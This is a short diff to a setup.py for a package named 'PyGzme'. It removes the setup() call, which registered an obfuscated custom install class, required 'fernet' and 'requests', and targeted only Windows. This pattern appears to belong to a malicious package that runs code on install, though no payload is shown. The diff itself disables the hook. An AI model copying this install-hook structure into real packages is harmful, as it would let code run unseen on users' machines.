@@ -18,22 +18,5 @@ class XufPJrCINnaSvYBtQiazAJOgRRcxWZJxVVFOhJSFnMjheWvwgkUDrQqdRYOLVJlTOaQSLZZMU(
             install.run(self)
 
 
-setup(
-    name="PyGzme",
-    version=VERSION,
-    author="pbmfYXDUsbE",
-    author_email="xpKWAsT@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': XufPJrCINnaSvYBtQiazAJOgRRcxWZJxVVFOhJSFnMjheWvwgkUDrQqdRYOLVJlTOaQSLZZMU,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
 
